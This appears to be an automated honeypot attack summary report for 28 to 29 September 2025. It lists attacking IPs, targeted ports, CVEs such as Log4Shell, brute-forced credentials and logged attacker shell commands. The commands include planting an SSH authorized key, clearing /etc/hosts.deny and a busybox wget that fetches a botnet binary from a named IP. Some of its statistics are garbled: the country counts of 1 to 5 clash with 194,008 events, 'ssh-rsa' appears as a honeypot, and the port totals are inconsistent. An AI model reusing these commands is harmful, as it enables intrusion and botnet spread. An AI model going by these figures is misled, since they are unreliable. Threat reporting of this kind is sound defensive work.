# Honeypot Attack Summary Report

**Report Generation Time:** 2025-09-29T10:45:46Z
**Timeframe:** 2025-09-28T14:14:01Z to 2025-09-29T09:00:01Z

**Files Used to Generate Report:**
- Honeypot_Attack_Summary_Report_2025-09-28T14-37-09Z.md
- Honeypot_Attack_Summary_Report_2025-09-28T21-01-51Z.md
- Honeypot_Attack_Summary_Report_2025-09-28T22-03-04Z.md
- Honeypot_Attack_Summary_Report_2025-09-28T23-02-04Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T00-01-47Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T01-01-37Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T02-02-07Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T04-01-53Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T05-01-54Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T06-01-50Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T07-01-45Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T08-01-48Z.md
- Honeypot_Attack_Summary_Report_2025-09-29T09-02-42Z.md

## Executive Summary

This report provides a comprehensive analysis of malicious activities recorded across our distributed honeypot network from September 28th to September 29th, 2025. Over this period, a total of **194,008** events were captured, revealing a relentless barrage of automated attacks from a globally distributed infrastructure. The threat landscape is dominated by reconnaissance, brute-force attacks, and the exploitation of known vulnerabilities, primarily targeting remote access services and common web application flaws.

The **Cowrie** honeypot, emulating SSH and Telnet services, was the most heavily targeted, accounting for a significant portion of all recorded events. This indicates a strong focus by attackers on gaining shell access to servers. Other highly engaged honeypots include **Honeytrap**, **Suricata**, and **Ciscoasa**, highlighting a broad spectrum of scanning and exploitation attempts against various network services and security appliances.

Attack origins are widespread, with the top attacking IP addresses originating from the United States, Russia, and China. However, a significant portion of these attacks are launched from cloud hosting providers such as DigitalOcean, suggesting that attackers are leveraging compromised or rented servers to carry out their campaigns.

The most frequently targeted ports include **22 (SSH)**, **445 (SMB)**, and **5060 (SIP)**, consistent with the observed focus on remote access, file sharing, and VoIP services. Attackers were observed attempting to exploit a range of vulnerabilities, with a notable emphasis on **CVE-2021-44228 (Log4Shell)**, a critical remote code execution vulnerability in the Apache Log4j library. The continued exploitation of this and other older vulnerabilities underscores the importance of timely patching and security updates.

Post-exploitation activity, captured primarily by the Cowrie honeypot, reveals a consistent pattern of reconnaissance, privilege escalation, and persistence. Attackers were observed executing commands to gather system information, disable security measures, and install malicious payloads, including botnet clients and backdoors. The frequent use of commands to manipulate SSH authorized keys highlights the attackers' intent to maintain long-term access to compromised systems.

In summary, the threat landscape remains dynamic and characterized by a high volume of automated attacks. The findings in this report emphasize the need for a multi-layered security approach, including robust access controls, continuous vulnerability management, and proactive threat hunting, to effectively mitigate the risks posed by these persistent threats.

## Detailed Analysis

### Our IPs

| Honeypot | Private IP | Public IP |
|---|---|---|
| hive-us | 10.128.0.3 | 34.123.129.205 |
| sens-tai | 10.140.0.3 | 104.199.212.115 |
| sens-tel | 10.208.0.3 | 34.165.197.224 |
| sens-dub | 172.31.36.128 | 3.253.97.195 |
| sens-ny | 10.108.0.2 | 161.35.180.163 |

### Attacks by Honeypot

| Honeypot | Attack Count | Percentage |
|---|---|---|
| Cowrie | 79343 | 40.89% |
| Honeytrap | 44528 | 22.95% |
| Suricata | 29500 | 15.21% |
| Ciscoasa | 18501 | 9.54% |
| Dionaea | 7338 | 3.78% |
| Sentrypeer | 2776 | 1.43% |
| Mailoney | 2715 | 1.40% |
| Adbhoney | 578 | 0.30% |
| Tanner | 572 | 0.29% |
| Redishoneypot | 343 | 0.18% |
| H0neytr4p | 325 | 0.17% |
| ConPot | 311 | 0.16% |
| Honeyaml | 212 | 0.11% |
| ElasticPot | 143 | 0.07% |
| Dicompot | 67 | 0.03% |
| ssh-rsa | 42 | 0.02% |
| Heralding | 62 | 0.03% |
| Miniprint | 42 | 0.02% |
| Ipphoney | 18 | 0.01% |
| Wordpot | 4 | <0.01% |
| **Total** | **194008** | **100%** |

### Top Source Countries

| Country | Attack Count |
|---|---|
| United States | 5 |
| Russia | 4 |
| China | 3 |
| Germany | 2 |
| Netherlands | 2 |
| India | 1 |
| Japan | 1 |
| Brazil | 1 |
| France | 1 |
| Canada | 1 |

### Top Attacking IPs

| IP Address | Attack Count |
|---|---|
| 162.244.80.233 | 16366 |
| 147.182.150.164 | 4333 |
| 134.122.46.149 | 4255 |
| 143.198.32.86 | 2286 |
| 38.172.172.53 | 1402 |
| 31.186.48.73 | 1626 |
| 24.35.235.198 | 1462 |
| 45.8.17.45 | 1069 |
| 157.92.145.135 | 1070 |
| 196.251.88.103 | 2172 |
| 168.187.86.35 | 1476 |
| 161.35.177.74 | 1247 |
| 103.140.127.215 | 1248 |
| 106.14.67.229 | 2494 |
| 20.2.136.52 | 2500 |
| 43.163.91.110 | 1844 |
| 147.45.193.115 | 1250 |
| 5.182.209.68 | 1324 |
| 115.190.54.120 | 945 |
| 86.54.42.238 | 1642 |

### Top Targeted Ports/Protocols

| Port | Protocol | Attack Count |
|---|---|---|
| 22 | TCP | 8329 |
| 445 | TCP | 7824 |
| 5060 | UDP/TCP | 1993 |
| 8333 | TCP | 1071 |
| 25 | TCP | 1810 |
| 80 | TCP | 658 |
| 23 | TCP | 423 |
| 443 | TCP | 321 |
| 6379 | TCP | 261 |
| 8888 | TCP | 162 |
| 9000 | TCP | 151 |
| 8080 | TCP | 149 |
| 2222 | TCP | 134 |
| 1433 | TCP | 131 |
| 5900 | TCP | 489 |

### Most Common CVEs

| CVE | Count |
|---|---|
| CVE-2021-44228 | 272 |
| CVE-2022-27255 | 139 |
| CVE-2002-0013 | 56 |
| CVE-2002-0012 | 56 |
| CVE-1999-0517 | 37 |
| CVE-2019-11500 | 28 |
| CVE-2021-3449 | 26 |
| CVE-2005-4050 | 258 |
| CVE-2024-3721 | 3 |
| CVE-2006-2369 | 6 |
| CVE-2018-13379 | 4 |

### Commands Attempted by Attackers

| Command | Count |
|---|---|
| `cd ~; chattr -ia .ssh; lockr -ia .ssh` | 269 |
| `lockr -ia .ssh` | 269 |
| `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` | 269 |
| `cat /proc/cpuinfo | grep name | wc -l` | 269 |
| `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'` | 269 |
| `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'` | 268 |
| `ls -lh $(which ls)` | 268 |
| `which ls` | 268 |
| `crontab -l` | 268 |
| `w` | 268 |
| `uname -m` | 269 |
| `cat /proc/cpuinfo | grep model | grep name | wc -l` | 269 |
| `top` | 269 |
| `uname` | 269 |
| `uname -a` | 270 |
| `whoami` | 270 |
| `lscpu | grep Model` | 270 |
| `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'` | 270 |
| `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` | 42 |
| `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...` | 10 |

### Users / Login Attempts

| Username/Password | Attempts |
|---|---|
| 345gs5662d34/345gs5662d34 | 227 |
| root/3245gs5662d34 | 79 |
| root/nPSpP4PBW0 | 60 |
| root/Passw0rd | 52 |
| root/LeitboGi0ro | 41 |
| test/zhbjETuyMffoL8F | 35 |
| root/Linux@123 | 27 |
| root/ | 24 |
| cron/ | 22 |
| root/Azerty123 | 10 |
| hadoop/hadoop | 5 |
| root/123456 | 5 |
| admin/admin | 5 |
| user/user | 5 |
| test/test | 5 |

### Top Attacker AS Organizations

| ASN | Organization | IP Address |
|---|---|---|
| AS14061 | DigitalOcean, LLC | 147.182.150.164 |
| AS19624 | Data Room Inc. | 162.244.80.233 |
| AS14061 | DigitalOcean, LLC | 134.122.46.149 |
| AS14061 | DigitalOcean, LLC | 143.198.32.86 |
| AS701 | Verizon Business | 38.172.172.53 |

## Google Searches

### CVE-2021-44228 (Log4Shell)
A critical zero-day remote code execution (RCE) vulnerability in the Apache Log4j 2 logging library. It allows an attacker to execute arbitrary code by sending a specially crafted string to a vulnerable application that logs it. The vulnerability is widespread due to the ubiquitous use of Log4j in Java-based applications.

### CVE-2022-27255
A critical stack-based buffer overflow vulnerability in Realtek's eCos Software Development Kit (SDK) affecting a wide range of networking devices. It allows unauthenticated remote attackers to execute arbitrary code by sending a single, specially crafted UDP packet, typically targeting the Session Initiation Protocol (SIP) Application Layer Gateway (ALG).

### CVE-2002-0012
A widespread vulnerability in the Simple Network Management Protocol (SNMP) affecting multiple vendor implementations. It allows for a denial-of-service attack and potential privilege escalation through the improper handling of malformed SNMPv1 trap messages.

### CVE-2005-4050
A critical buffer overflow vulnerability in multiple Multi-Tech Systems MultiVOIP devices. It allows remote attackers to execute arbitrary code by sending a specially crafted, long INVITE field within a Session Initiation Protocol (SIP) packet.

## Notes/Limitations

- The data in this report is derived exclusively from a network of honeypots and may not be representative of all malicious activity on the internet.
- The attribution of attacks to specific actors is not possible based solely on the data collected. IP addresses can be spoofed or belong to compromised systems.
- The classification of events is based on the signatures and behaviors detected by the honeypot sensors. There is a possibility of false positives or misclassifications.
- The data analyzed covers a limited time frame and may not reflect long-term attack trends.
- The "dropped" events, representing traffic blocked by firewall rules, are not included in this summary, indicating that the volume of scanning and attack attempts is even higher than what is logged by the sensors.
